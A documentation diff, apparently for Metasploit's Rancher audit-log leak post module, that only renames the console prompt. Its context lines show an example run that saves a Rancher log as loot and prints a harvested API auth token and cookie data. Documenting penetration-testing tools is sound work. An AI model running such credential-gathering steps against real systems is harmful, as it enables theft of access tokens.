@@ -82,8 +82,8 @@ resource (rancher_logs.rb)> set session 1
 session => 1
 resource (rancher_logs.rb)> set verbose true
 verbose => true
-msf6 post(linux/gather/rancher_audit_log_leak) > 
-msf6 post(linux/gather/rancher_audit_log_leak) > run
+msf post(linux/gather/rancher_audit_log_leak) > 
+msf post(linux/gather/rancher_audit_log_leak) > run
 
 [+] Rancher log saved to: /root/.msf4/loot/20240313165133_default_172.17.0.2_rancher.api.log_616439.txt
 [+] Found X-Api-Auth-Header token-p6nzp:zcpscwmzbx2kvfdffl8lqlqv5564s98225zn5ds67rtnw5m4hcjlqs
@@ -117,5 +117,5 @@ msf6 post(linux/gather/rancher_audit_log_leak) > run
                           CFh1y8IM; path=/; expires=Wed, 13-Mar-24 15:44:09 GMT; domain=.digitalocean.com; HttpOnly; Secure; SameSite=None
 
 [*] Post module execution completed
-msf6 post(linux/gather/rancher_audit_log_leak) > 
+msf post(linux/gather/rancher_audit_log_leak) > 
 ```
